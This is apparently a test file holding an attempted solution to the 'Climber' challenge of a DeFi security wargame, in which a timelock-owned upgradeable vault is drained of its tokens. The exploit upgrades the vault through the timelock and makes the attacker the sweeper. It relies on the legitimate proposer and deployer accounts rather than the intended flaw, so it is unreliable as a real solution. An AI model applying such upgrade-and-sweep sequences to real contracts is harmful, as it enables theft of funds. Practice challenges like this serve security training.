const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { AbiCoder, defaultAbiCoder } = require('ethers/lib/utils');

describe('[Challenge] Climber', function () {
  let deployer, proposer, sweeper, attacker;

  // Vault starts with 10 million tokens
  const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, attacker] =
      await ethers.getSigners();

    await ethers.provider.send('hardhat_setBalance', [
      attacker.address,
      '0x16345785d8a0000', // 0.1 ETH
    ]);
    expect(
      await ethers.provider.getBalance(attacker.address)
    ).to.equal(ethers.utils.parseEther('0.1'));

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    this.vault = await upgrades.deployProxy(
      await ethers.getContractFactory('ClimberVault', deployer),
      [deployer.address, proposer.address, sweeper.address],
      { kind: 'uups' }
    );

    expect(await this.vault.getSweeper()).to.eq(sweeper.address);
    expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt(
      '0'
    );
    expect(await this.vault.owner()).to.not.eq(
      ethers.constants.AddressZero
    );
    expect(await this.vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await this.vault.owner();
    this.timelock = await (
      await ethers.getContractFactory('ClimberTimelock', deployer)
    ).attach(timelockAddress);

    // Ensure timelock roles are correctly initialized
    expect(
      await this.timelock.hasRole(
        await this.timelock.PROPOSER_ROLE(),
        proposer.address
      )
    ).to.be.true;
    expect(
      await this.timelock.hasRole(
        await this.timelock.ADMIN_ROLE(),
        deployer.address
      )
    ).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    this.token = await (
      await ethers.getContractFactory('DamnValuableToken', deployer)
    ).deploy();
    await this.token.transfer(
      this.vault.address,
      VAULT_TOKEN_BALANCE
    );
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */

    const cvv2Factory = await ethers.getContractFactory(
      'ClimberVaultV2',
      deployer
    );

    const cvv2 = await cvv2Factory.deploy();

    let ABI = ['function upgradeTo(address)'];
    let iface = new ethers.utils.Interface(ABI);

    let dataE = iface.encodeFunctionData('upgradeTo', [cvv2.address]);

    await this.timelock
      .connect(proposer)
      .schedule(
        [this.vault.address],
        [0],
        [dataE],
        ethers.utils.hexZeroPad(ethers.utils.hexlify(1), 32)
      );

    // Advance time 1 hour
    await ethers.provider.send('evm_increaseTime', [60 * 60]); // 1 hour

    await this.timelock.execute(
      [this.vault.address],
      [0],
      [dataE],
      ethers.utils.hexZeroPad(ethers.utils.hexlify(1), 32)
    );

    ABI = ['function setSweeper(address)'];
    iface = new ethers.utils.Interface(ABI);

    dataE = iface.encodeFunctionData('setSweeper', [
      attacker.address,
    ]);

    await this.timelock
      .connect(proposer)
      .schedule(
        [this.vault.address],
        [0],
        [dataE],
        ethers.utils.hexZeroPad(ethers.utils.hexlify(2), 32)
      );

    await ethers.provider.send('evm_increaseTime', [60 * 60]); // 1 hour

    await this.timelock.execute(
      [this.vault.address],
      [0],
      [dataE],
      ethers.utils.hexZeroPad(ethers.utils.hexlify(2), 32)
    );

    await expect(await this.vault.getSweeper()).to.eq(
      attacker.address
    );

    await this.vault.connect(attacker).sweepFunds(this.token.address);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
    expect(await this.token.balanceOf(attacker.address)).to.eq(
      VAULT_TOKEN_BALANCE
    );
  });
});
